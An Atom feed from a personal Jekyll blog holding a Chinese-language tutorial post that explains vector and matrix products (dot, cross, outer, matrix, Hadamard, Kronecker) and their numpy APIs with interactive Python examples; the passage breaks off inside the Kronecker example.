<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://iamnotphage.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://iamnotphage.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-03-17T06:02:51+00:00</updated><id>https://iamnotphage.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">向量和矩阵各种乘积以及其对应的numpy库API解释</title><link href="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/" rel="alternate" type="text/html" title="向量和矩阵各种乘积以及其对应的numpy库API解释"/><published>2025-02-27T00:00:00+00:00</published><updated>2025-02-27T00:00:00+00:00</updated><id>https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/"><![CDATA[<p>在学习cs231n关于反向传播矩阵求导的时候发现这部分内容非常绕，并且numpy对应的接口也有很多，在这里记录笔记分辨各类矩阵乘法的内容。</p> <p>下面主要解释各类乘积的别名、常用符号、含义以及对应的常用的numpy接口。</p> <blockquote> <p>本文暂不考虑复数域的情况，并且将严格按照wikipedia的定义以及<a href="https://numpy.org/doc/stable/reference/routines.linalg.html">numpy API reference</a>阐述</p> </blockquote> <h1 id="前置知识">前置知识</h1> <p>首先有必要指出几个必须认识的名词:</p> <ul> <li>标量: scalar</li> <li>向量: vector</li> <li>矩阵: matrix</li> <li>张量: tensor (区别于物理学上的张量)</li> </ul> <p>此外<code class="language-plaintext highlighter-rouge">numpy</code>库中经常声明类型为<code class="language-plaintext highlighter-rouge">ndarray</code>的变量，在阅读之前，有必要了解其中的属性。</p> <ol> <li>shape: 通常是一个元组，如果是(,N)或者(N,)则代表向量 (N,M)代表二维的矩阵</li> <li>ndim: 这个<code class="language-plaintext highlighter-rouge">ndarray</code>的维度</li> </ol> <p>比如:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="n">shape</span>
<span class="p">(</span><span class="mi">3</span><span class="p">,)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="n">ndim</span>  <span class="c1"># number of dimentions
</span><span class="mi">1</span>           <span class="c1"># 一维的向量（不是矩阵）
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">c</span><span class="p">.</span><span class="n">ndim</span>
<span class="mi">2</span>           <span class="c1"># 二维 也就是矩阵
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span><span class="p">.</span><span class="n">shape</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>      <span class="c1"># 1x3的矩阵
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">tensorA</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">12</span><span class="p">)]).</span><span class="nf">reshape</span><span class="p">([</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">tensorA</span>
<span class="nf">array</span><span class="p">([[[</span> <span class="mi">0</span><span class="p">,</span>  <span class="mi">1</span><span class="p">,</span>  <span class="mi">2</span><span class="p">],</span>
        <span class="p">[</span> <span class="mi">3</span><span class="p">,</span>  <span class="mi">4</span><span class="p">,</span>  <span class="mi">5</span><span class="p">]],</span>

       <span class="p">[[</span> <span class="mi">6</span><span class="p">,</span>  <span class="mi">7</span><span class="p">,</span>  <span class="mi">8</span><span class="p">],</span>
        <span class="p">[</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">]]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">tensorA</span><span class="p">.</span><span class="n">shape</span>
<span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>   <span class="c1"># 2个2x3的矩阵组成的Tensor
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">tensorA</span><span class="p">.</span><span class="n">ndim</span>
<span class="mi">3</span>           <span class="c1"># 三维
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">test</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([[[[[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]]]]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">test</span>
<span class="nf">array</span><span class="p">([[[[[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]]]]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">shape</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">ndim</span>
<span class="mi">5</span>           <span class="c1"># 仔细看左括号的数量就知道几维了 最后两个维度是1x4
</span></code></pre></div></div> <h1 id="点乘">点乘</h1> <p>点乘(<strong>dot product</strong>)是定义在两个<strong>向量</strong>之间的运算，也就是矩阵之间<strong>严格来说没有矩阵点乘</strong>这种说法</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>点积</strong>、<strong>内积</strong>、数量积、标量积</td> <td><strong>dot product</strong>、inner product</td> <td>$a\cdot b$</td> <td><code class="language-plaintext highlighter-rouge">numpy.dot</code>、<code class="language-plaintext highlighter-rouge">numpy.inner</code>、<code class="language-plaintext highlighter-rouge">numpy.matmul</code>、<code class="language-plaintext highlighter-rouge">@</code></td> </tr> </tbody> </table> <blockquote> <p>个人喜好不太推荐用numpy.matmul和@，因为他们本身就是表示矩阵乘法</p> </blockquote> <p>eg. 数值定义如下</p> <p>向量 $\vec{a}=[a_1, a_2, \cdots, a_n]$ 和 $\vec{b}=[b_1, b_2, \cdots, b_n]$ 的点乘结果是(一个<strong>标量</strong>)：</p> \[\vec{a}\cdot \vec{b} = \sum_{i=1}^n a_ib_i = a_1b_1 + a_2b_2 + \cdots + a_nb_n\] <p>此外几何定义自行查看高中内容，此处不多赘述</p> <p>numpy例子:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">])</span> <span class="c1"># 注意这里定义的是1维的向量
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>    <span class="c1"># 更推荐
</span><span class="mi">2</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">inner</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>  <span class="c1"># 更推荐
</span><span class="mi">2</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">matmul</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="mi">2</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">@</span> <span class="n">b</span> <span class="c1"># @ 运算符等价于np.matmul()
</span><span class="mi">2</span>
</code></pre></div></div> <p>前两个<code class="language-plaintext highlighter-rouge">np.dot</code>和<code class="language-plaintext highlighter-rouge">np.inner</code>根据函数名也容易理解是在计算点乘（内积）</p> <p>并且<code class="language-plaintext highlighter-rouge">numpy</code>文档也写的很清楚:</p> <p>(下文的<code class="language-plaintext highlighter-rouge">1-D arrays</code>指的是维度为<code class="language-plaintext highlighter-rouge">1</code>的<code class="language-plaintext highlighter-rouge">ndarray</code>，也就是所谓的<code class="language-plaintext highlighter-rouge">vector</code>)</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">numpy</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
<span class="c1"># Dot product of two arrays. Specifically,
# If both a and b are 1-D arrays, it is
# inner product of vectors (without complex conjugation).
</span>
<span class="n">numpy</span><span class="p">.</span><span class="nf">inner</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">/</span><span class="p">)</span>
<span class="c1"># Inner product of two arrays.
# Ordinary inner product of vectors for 1-D arrays
# (without complex conjugation), in higher dimensions a
# sum product over the last axes.
</span></code></pre></div></div> <p>但是为什么后面两个，<code class="language-plaintext highlighter-rouge">np.matmul</code>和<code class="language-plaintext highlighter-rouge">@</code>运算符却同样能给出点乘答案？</p> <p>首先，<code class="language-plaintext highlighter-rouge">@</code>运算符等价于<code class="language-plaintext highlighter-rouge">np.matmul</code>，所以这里解释<code class="language-plaintext highlighter-rouge">np.matmul</code>:</p> <blockquote> <p>If the first argument is 1-D, it is promoted to a matrix by <strong>prepending</strong> a 1 to its dimensions. After matrix multiplication the prepended 1 is removed. (For stacks of vectors, use vecmat.)</p> </blockquote> <blockquote> <p>If the second argument is 1-D, it is promoted to a matrix by <strong>appending</strong> a 1 to its dimensions. After matrix multiplication the appended 1 is removed. (For stacks of vectors, use matvec.)</p> </blockquote> <p>注意这里的<code class="language-plaintext highlighter-rouge">prepending</code>和<code class="language-plaintext highlighter-rouge">appending</code></p> <p>这里说了，如果第一个参数是<code class="language-plaintext highlighter-rouge">1-D</code>也就是一维的话，那么会<code class="language-plaintext highlighter-rouge">prepending</code>一个<code class="language-plaintext highlighter-rouge">1</code>扩充成矩阵，变成<code class="language-plaintext highlighter-rouge">shape</code>为<code class="language-plaintext highlighter-rouge">(1,N)</code></p> <p>第二个参数是<code class="language-plaintext highlighter-rouge">1-D</code>也就是一维的话，那么会<code class="language-plaintext highlighter-rouge">appending</code>一个<code class="language-plaintext highlighter-rouge">1</code>扩充成矩阵，变成<code class="language-plaintext highlighter-rouge">shape</code>为<code class="language-plaintext highlighter-rouge">(N,1)</code></p> <p>那么这里不就恰好变成两个矩阵相乘得到<code class="language-plaintext highlighter-rouge">(1,1)</code>的矩阵，同时移除这个维度，变成了一个<code class="language-plaintext highlighter-rouge">scalar</code>也就是标量</p> <p>所以严格来说，不是<code class="language-plaintext highlighter-rouge">numpy.matmul</code>和<code class="language-plaintext highlighter-rouge">@</code>能计算点乘，而是因为<code class="language-plaintext highlighter-rouge">matmul</code>对一维输入的特殊处理，恰好算出来点乘。</p> <h1 id="叉乘">叉乘</h1> <p>叉乘(<strong>cross product</strong>)同样是定义在<strong>两个向量</strong>之间的运算，是对三维空间中的<strong>两个向量</strong>的二元运算，所以矩阵之间也是不存在叉乘的说法的</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>叉积</strong>、<strong>外积</strong>、向量积</td> <td><strong>cross product</strong>、external product、vector product、<strong>outer product</strong></td> <td>$a\times b$、$a \otimes b$</td> <td><code class="language-plaintext highlighter-rouge">numpy.cross</code>、<code class="language-plaintext highlighter-rouge">numpy.outer</code></td> </tr> </tbody> </table> <p>叉乘在数学上定义如下:</p> \[\mathbf{a} \times \mathbf{b} = \| \mathbf{a} \| \| \mathbf{b} \| \sin(\theta) \ \mathbf{n}\] <p>也就是通过右手法则求出第三个向量，垂直于 $a$ 和 $b$</p> <p><strong>但是！这里有一个混淆的点！</strong></p> <ul> <li> <p><strong>叉积</strong>(<strong>cross product</strong>)才是上面数学定义的，求 $a$ 和 $b$ 所在平面的<strong>法向量</strong>。对应符号 $a \times b$。<code class="language-plaintext highlighter-rouge">numpy</code>中使用<code class="language-plaintext highlighter-rouge">numpy.cross()</code>来计算。</p> </li> <li> <p><strong>外积</strong>(<strong>outer product</strong>)是另一个概念！在线性代数中一般指两个向量的<a href="https://zh.wikipedia.org/wiki/%E5%A4%96%E7%A7%AF_(%E5%BC%A0%E9%87%8F%E7%A7%AF)"><strong>张量积</strong></a>，其结果为一<strong>矩阵</strong>；与外积相对，两向量的内积结果为标量。外积也可视作是矩阵的<a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E7%BD%97%E5%86%85%E5%85%8B%E7%A7%AF"><strong>Kronecker积</strong></a>的一种特例。也就是 $a \otimes b$。<code class="language-plaintext highlighter-rouge">numpy</code>中使用<code class="language-plaintext highlighter-rouge">numpy.outer()</code>来计算。</p> </li> </ul> <p>这两个名词常有混在一起，我推荐直接使用英文名，或者根据其输出结果来分辨。</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
<span class="nf">array</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">b</span>
<span class="nf">array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">outer</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="c1"># 外积，结果为矩阵
</span><span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">outer</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">)</span> <span class="c1"># 外积，结果为矩阵
</span><span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">cross</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="c1"># 叉积，结果仍然是向量
</span><span class="nf">array</span><span class="p">([</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>  <span class="mi">1</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">cross</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">)</span> <span class="c1"># 叉积，结果仍然是向量
</span><span class="nf">array</span><span class="p">([</span> <span class="mi">3</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div></div> <p>看起来<code class="language-plaintext highlighter-rouge">np.outer(a,b)</code>像是将 $a$ 变成<code class="language-plaintext highlighter-rouge">(3,1)</code>的矩阵，再将 $b$ 变成<code class="language-plaintext highlighter-rouge">(1,3)</code>再进行矩阵相乘的样子</p> <h1 id="矩阵乘法">矩阵乘法</h1> <p>首先是标量乘以矩阵，这个没什么好说的，矩阵逐个元素乘这个数就行了。</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">matrix</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">matrix</span><span class="p">)</span> <span class="c1"># 因为dot输入参数如果有一个是0-D（也就是标量）的话
</span><span class="nf">array</span><span class="p">([[</span> <span class="mi">2</span><span class="p">,</span>  <span class="mi">4</span><span class="p">,</span>  <span class="mi">6</span><span class="p">],</span> <span class="c1"># 等价于np.multiply(a,b)也就是 a * b
</span>       <span class="p">[</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">12</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">14</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">18</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">multiply</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">matrix</span><span class="p">)</span>
<span class="nf">array</span><span class="p">([[</span> <span class="mi">2</span><span class="p">,</span>  <span class="mi">4</span><span class="p">,</span>  <span class="mi">6</span><span class="p">],</span> <span class="c1"># 这种情况更推荐用 multiply或者*
</span>       <span class="p">[</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">12</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">14</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">18</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">matrix</span>       <span class="c1"># * 运算符等价于np.multiply
</span><span class="nf">array</span><span class="p">([[</span> <span class="mi">2</span><span class="p">,</span>  <span class="mi">4</span><span class="p">,</span>  <span class="mi">6</span><span class="p">],</span>
       <span class="p">[</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">12</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">14</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">18</span><span class="p">]])</span>
</code></pre></div></div> <p>然后到所谓的<strong>矩阵乘法</strong>(<strong>matrix multiplication</strong>)设 $A$ 是 $n\times m$ 的矩阵， $B$ 是 $m\times p$ 的矩阵，则它们的矩阵积 $AB$ 是 $n\times p$ 的矩阵。 $A$ 中每一行的 $m$ 个元素都与 $B$ 中对应列的 $m$ 个元素对应相乘，这些乘积的和就是 $AB$ 中的一个元素。</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>矩阵乘法</strong></td> <td><strong>matrix multiplication</strong></td> <td>$AB$</td> <td><code class="language-plaintext highlighter-rouge">numpy.dot</code>、<code class="language-plaintext highlighter-rouge">numpy.matmul</code>、<code class="language-plaintext highlighter-rouge">@</code></td> </tr> </tbody> </table> <p>也就是输入是两个<code class="language-plaintext highlighter-rouge">2-D</code>的<code class="language-plaintext highlighter-rouge">ndarray</code>，所以根据函数名也能知道<code class="language-plaintext highlighter-rouge">matmul</code>和<code class="language-plaintext highlighter-rouge">@</code>是计算矩阵乘法的。</p> <p>同时，如果<code class="language-plaintext highlighter-rouge">numpy.dot</code>的输入是两个<code class="language-plaintext highlighter-rouge">2-D</code>的<code class="language-plaintext highlighter-rouge">ndarray</code>的话，等价于<code class="language-plaintext highlighter-rouge">matmul</code>:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="nf">reshape</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># 变成矩阵
</span><span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">matmul</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">matrix</span><span class="p">)</span>
<span class="nf">array</span><span class="p">([</span><span class="mi">30</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">42</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">@</span> <span class="n">matrix</span>
<span class="nf">array</span><span class="p">([</span><span class="mi">30</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">42</span><span class="p">])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">matrix</span><span class="p">)</span>
<span class="nf">array</span><span class="p">([</span><span class="mi">30</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">42</span><span class="p">])</span>
</code></pre></div></div> <h1 id="hadamard乘积">Hadamard乘积</h1> <p>给定<strong>两个相同维度的矩阵</strong>可计算有阿达马乘积（<strong>Hadamard product</strong>），或称做逐项乘积、分素乘积（<strong>element-wise product</strong>, entrywise product）。</p> <p>重点就在于<strong>element-wise</strong></p> \[\begin{bmatrix} 1 &amp; 3 &amp; 2 \\ 1 &amp; 0 &amp; 0 \\ 1 &amp; 2 &amp; 2 \end{bmatrix} \circ \begin{bmatrix} 0 &amp; 0 &amp; 2 \\ 7 &amp; 5 &amp; 0 \\ 2 &amp; 1 &amp; 1 \end{bmatrix} = \begin{bmatrix} 1 \cdot 0 &amp; 3 \cdot 0 &amp; 2 \cdot 2 \\ 1 \cdot 7 &amp; 0 \cdot 5 &amp; 0 \cdot 0 \\ 1 \cdot 2 &amp; 2 \cdot 1 &amp; 2 \cdot 1 \end{bmatrix} = \begin{bmatrix} 0 &amp; 0 &amp; 4 \\ 7 &amp; 0 &amp; 0 \\ 2 &amp; 2 &amp; 2 \end{bmatrix}\] <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>阿达马乘积</strong></td> <td><strong>Hadamard product</strong></td> <td>$A \bigodot B$、$A \circ B$</td> <td><code class="language-plaintext highlighter-rouge">numpy.mutiply</code>、<code class="language-plaintext highlighter-rouge">*</code></td> </tr> </tbody> </table> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">z</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">matrix</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">z</span> <span class="o">*</span> <span class="n">matrix</span> <span class="c1"># 等价于np.multiply
</span><span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">multiply</span><span class="p">(</span><span class="n">z</span><span class="p">,</span><span class="n">matrix</span><span class="p">)</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">]])</span>
</code></pre></div></div> <p>需注意的是，阿达马乘积是克罗内克乘积的子矩阵</p> <h1 id="kronecker乘积">Kronecker乘积</h1> <p><em>比较少见</em></p> <p>数学上，<strong>克罗内克积</strong>(<strong>Kronecker product</strong>)是两个任意大小的矩阵间的运算，表示为 $\bigotimes$。简单地说，就是将前一个矩阵的每个元素乘上后一个完整的矩阵。克罗内克积是<strong>外积</strong>从向量到矩阵的推广，也是张量积在标准基下的矩阵表示。</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>克罗内克积</strong>、直积</td> <td><strong>Kronecker product</strong>、direct product</td> <td>$A \bigotimes B$</td> <td><code class="language-plaintext highlighter-rouge">numpy.kron</code></td> </tr> </tbody> </table> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">b</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">kron</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
